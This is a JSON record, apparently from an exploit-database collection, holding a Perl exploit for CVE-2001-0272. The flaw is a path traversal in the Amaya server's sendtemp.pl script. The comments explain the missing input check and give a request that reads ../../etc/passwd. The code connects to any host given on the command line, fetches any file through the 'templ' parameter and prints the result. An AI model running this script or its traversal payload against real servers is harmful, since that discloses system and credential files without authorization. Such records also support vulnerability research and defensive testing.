{
  "id": "289",
  "title": "sendtemp.pl - Read Access to Files",
  "cve": "CVE-2001-0272",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl -w\r\n\r\n# sendtemp.pl: A part of the Amaya Web development\r\n# server contains a file disclosure  vulnerability, \r\n# which allows remote, read access to files \r\n# on the servers file system,  as whichever \r\n# user the httpd is running as.\r\n#\r\n# The Vulnerability is really quite simple..\r\n# When the `templ` argument is past to\r\n# sendtemp.pl it adds a link to the chosen stylesheet\r\n# and a META field containing the publication's \r\n# URL of the new file to the chosen template.\r\n# For example:\r\n# http://localhost/cgi-bin/sendtemp.pl?templ=template.xml\r\n# This is all well and good,  however.. \r\n# There is no sanity checking on the param you pass to the script..\r\n# Ie: my $temp_file = param(\"templ\");\r\n#\r\n# So by simply issuing a GET to:\r\n# \"http://localhost/cgi-bin/sendtemp.pl?templ=../../etc/passwd\"\r\n# The systems file system can be traversed and the passwd file can be read. \r\n# (Assuming the http daemon hasn't been run under chroot())\r\n#\r\n# Follows is a simple exploit.. however, its just as easy \r\n# to do this manually in your web browser.\r\n# I really couldnt be bothered to format the output in any way,\r\n# It only encourages script kiddies.\r\n#\r\n# Finally, \"l33t hax0r greetz\" to..\r\n# ne0h, b0red, loophole, shad0w and the old dL crew..\r\n# Scott, Jim, Mike.. All of the guys at Global Intersec.\r\n#\r\n# Tom Parker - tom@rooted.net\r\n# MRX of HHP-Programming (www.hhp-programming.net)\r\n# Global InterSec INC California - Security Audits, Penetration testing, code auditing.\r\n\r\nuse IO::Socket;\r\nprint qq~\r\n----------------------------------------------------------\r\nW3.ORG sendtemp.pl exploit by Tom Parker - tom\\@rooted.net\r\n    MRX of HHP-Programming (www.hhp-programming.net)\r\n\t  -  Global InterSec INC California -\r\n----------------------------------------------------------\r\n~;\r\nif((!defined($ARGV[0]))||(!defined($ARGV[1]))) { print \"Usage\\: \\%filename\\.pl \\<hostname\\> \\<file-to-get\\>\\n\"; exit 0; }\r\n$SOCKET = IO::Socket::INET->new(\"$ARGV[0]:80\");\r\nprint $SOCKET \"GET /cgi-bin/sendtemp.pl?templ=$ARGV[1]\\n\";\r\nprint \"Sent request for $ARGV[1] (http://$ARGV[0]/cgi-bin/sendtemp.pl\\?templ\\=$ARGV[1])\\n\";\r\nwhile(<$SOCKET>) {\r\npush @DATA, $_;\r\n\r\n}\r\nmy $woot = join(' ',@DATA);\r\nif($woot =~/$ARGV[1] wasn't found/) { print \"$ARGV[1] dosnt seem to exist.\\n\"; exit 0; } \r\nelse { print \"@DATA\"; }\r\n\r\n# milw0rm.com [2001-03-04]",
  "url": "https://www.exploit-db.com/exploits/289"
}